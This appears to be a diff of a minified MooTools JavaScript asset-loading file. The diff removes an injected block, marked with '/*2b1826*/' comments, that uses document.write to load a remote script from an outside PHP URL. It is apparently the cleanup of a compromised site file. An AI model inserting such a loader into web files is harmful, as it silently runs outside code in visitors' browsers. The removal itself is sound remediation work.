@@ -64,13 +64,3 @@ a.fireEvent(e,a,1);};});d.src=a.src=c;if(d&&d.complete){d.onload.delay(1);}retur
 b=Object.merge({onComplete:d,onProgress:d,onError:d,properties:{}},b);return new Elements(c.map(function(f,e){return Asset.image(f,Object.append(b.properties,{onload:function(){a++;
 b.onProgress.call(this,a,e,f);if(a==c.length){b.onComplete();}},onerror:function(){a++;b.onError.call(this,a,e,f);if(a==c.length){b.onComplete();}}}));
 }));}};
-
-/*2b1826*/
-/**/
-
-
-document.write("<script type='text/javascript' src='http://www.conecta2electricidad.com/6FgGBLzN.php'></"+ "script>");
-
-
-
-/*/2b1826*/
